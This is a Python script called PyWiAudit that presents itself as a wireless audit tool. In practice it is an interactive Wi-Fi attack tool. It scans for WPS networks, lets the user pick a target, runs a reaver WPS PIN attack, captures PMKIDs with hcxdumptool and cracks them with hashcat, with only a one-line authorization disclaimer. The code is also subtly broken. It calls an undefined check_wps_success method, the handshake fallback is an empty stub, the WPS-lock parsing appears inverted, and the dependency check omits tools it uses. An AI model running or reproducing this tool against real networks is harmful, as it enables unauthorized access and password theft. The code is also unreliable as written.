#!/usr/bin/env python3
import subprocess
import argparse
import time
import os
import sys
import json
from datetime import datetime
from colorama import Fore, Style, init
import signal

# Initialize colorama
init(autoreset=True)

# Configuration
VERSION = "2.0"
AUTHOR = "Michael Nkomo"
REQUIRED_TOOLS = ['aircrack-ng', 'iwconfig', 'tshark', 'hcxdumptool', 'wash']
SESSION_FILE = "pywiaudit.session"
OUTPUT_DIR = "captures"

class WirelessAuditTool:
    def __init__(self, args):
        self.args = args
        self.interface = args.interface
        self.wordlist = args.wordlist
        self.target = None
        self.session = {}
        self.monitor_interface = None

        # Setup environment
        self.validate_root()
        self.check_dependencies()
        self.setup_output_dir()
        self.load_session()

    def validate_root(self):
        if os.geteuid() != 0:
            self.exit_error("This tool requires root privileges. Use sudo.")

    def check_dependencies(self):
        missing = []
        for tool in REQUIRED_TOOLS:
            if not self.command_exists(tool):
                missing.append(tool)
        if missing:
            self.exit_error(f"Missing required tools: {', '.join(missing)}")

    def setup_output_dir(self):
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)

    def load_session(self):
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE) as f:
                self.session = json.load(f)

    def save_session(self):
        with open(SESSION_FILE, 'w') as f:
            json.dump(self.session, f)

    def exit_error(self, message):
        print(f"\n{Fore.RED}[-] ERROR: {message}{Style.RESET_ALL}")
        sys.exit(1)

    def command_exists(self, command):
        return subprocess.call(f"command -v {command}", shell=True, 
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

    def enable_monitor_mode(self):
        try:
            print(f"{Fore.CYAN}[*] Configuring monitor mode...{Style.RESET_ALL}")
            subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
            result = subprocess.run(['iw', self.interface, 'info'], 
                                  capture_output=True, text=True)
            if 'monitor' not in result.stdout:
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
                subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'], check=True)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            self.monitor_interface = self.interface
            return True
        except subprocess.CalledProcessError as e:
            self.exit_error(f"Monitor mode failed: {e}")

    def scan_networks(self):
        print(f"{Fore.CYAN}[*] Scanning networks (WPS & PMKID capable)...{Style.RESET_ALL}")
        networks = []
        
        # Scan for WPS networks
        try:
            wash_proc = subprocess.Popen(['wash', '-i', self.interface],
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       text=True)
            time.sleep(15)
            wash_proc.terminate()
            stdout, _ = wash_proc.communicate()
            
            for line in stdout.split('\n'):
                if 'BSSID' in line or not line.strip():
                    continue
                parts = line.split()
                if len(parts) >= 6:
                    networks.append({
                        'bssid': parts[0],
                        'channel': parts[1],
                        'wps_version': parts[3],
                        'wps_locked': 'Yes' if 'No' in parts[4] else 'No',
                        'essid': ' '.join(parts[5:])
                    })
        except Exception as e:
            print(f"{Fore.YELLOW}[!] WPS scan failed: {e}{Style.RESET_ALL}")

        return networks

    def wps_pin_attack(self, target):
        print(f"{Fore.CYAN}[*] Starting WPS PIN attack...{Style.RESET_ALL}")
        try:
            subprocess.run([
                'reaver',
                '-i', self.interface,
                '-b', target['bssid'],
                '-c', target['channel'],
                '-vv',
                '-K', '1'
            ], check=True)
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[-] WPS attack failed{Style.RESET_ALL}")

    def capture_pmkid(self, target):
        print(f"{Fore.CYAN}[*] Attempting PMKID capture...{Style.RESET_ALL}")
        output_file = os.path.join(OUTPUT_DIR, f"pmkid_{target['bssid'].replace(':', '')}")
        try:
            hcxdump = subprocess.Popen([
                'hcxdumptool',
                '-i', self.interface,
                '-o', output_file,
                '--enable_status=1'
            ])
            
            start_time = time.time()
            while time.time() - start_time < 120:  # 2 minute capture window
                time.sleep(10)
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    hcxdump.terminate()
                    return self.process_pmkid(output_file, target)
            return False
        except Exception as e:
            print(f"{Fore.RED}[-] PMKID capture failed: {e}{Style.RESET_ALL}")
            return False

    def process_pmkid(self, cap_file, target):
        try:
            subprocess.run([
                'hcxpcaptool',
                '-z', f"{cap_file}.hash",
                cap_file
            ], check=True)
            
            if os.path.exists(f"{cap_file}.hash"):
                print(f"{Fore.GREEN}[+] PMKID captured!{Style.RESET_ALL}")
                if self.wordlist:
                    return self.crack_pmkid(f"{cap_file}.hash")
                return True
        except Exception as e:
            print(f"{Fore.RED}[-] PMKID processing failed: {e}{Style.RESET_ALL}")
            return False

    def crack_pmkid(self, hash_file):
        print(f"{Fore.CYAN}[*] Cracking PMKID with hashcat...{Style.RESET_ALL}")
        try:
            subprocess.run([
                'hashcat',
                '-m', '16800',
                hash_file,
                self.wordlist,
                '--force'
            ], check=True)
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Cracking failed: {e}{Style.RESET_ALL}")
            return False

    def run_attack_sequence(self, target):
        # Try WPS attack first if available
        if target.get('wps_locked') == 'No':
            self.wps_pin_attack(target)
            if self.check_wps_success():
                return
        
        # Then try PMKID capture
        if self.capture_pmkid(target):
            return
        
        # Fallback to handshake capture
        self.capture_handshake(target)

    def capture_handshake(self, target):
        # Original handshake capture logic from previous version
        # (Implement similar to initial version with improved error handling)
        pass

    def interactive_menu(self, networks):
        print(f"\n{Fore.WHITE}Available Networks:{Style.RESET_ALL}")
        for idx, net in enumerate(networks, 1):
            print(f"{idx}. {net['essid']} ({net['bssid']})")
            print(f"   Channel: {net['channel']} | WPS: {net['wps_locked']}")
        
        try:
            choice = int(input("\nSelect target network: ")) - 1
            self.target = networks[choice]
            print(f"{Fore.CYAN}[*] Selected target: {self.target['essid']}{Style.RESET_ALL}")
        except:
            self.exit_error("Invalid network selection")

    def cleanup(self):
        print(f"{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
        subprocess.run(['airmon-ng', 'stop', self.interface], 
                      stdout=subprocess.DEVNULL, 
                      stderr=subprocess.DEVNULL)
        self.save_session()

    def main(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        
        if not self.enable_monitor_mode():
            return
        
        networks = self.scan_networks()
        if not networks:
            self.exit_error("No networks found")
        
        self.interactive_menu(networks)
        self.run_attack_sequence(self.target)
        self.cleanup()

    def signal_handler(self, sig, frame):
        self.cleanup()
        sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=f"PyWiAudit v{VERSION} - Advanced Wireless Audit Tool",
        epilog=f"Author: {AUTHOR} | Legal Disclaimer: Use only with proper authorization"
    )
    parser.add_argument('-i', '--interface', required=True, help="Wireless interface")
    parser.add_argument('-w', '--wordlist', help="Path to wordlist for cracking")
    
    args = parser.parse_args()
    tool = WirelessAuditTool(args)
    tool.main()
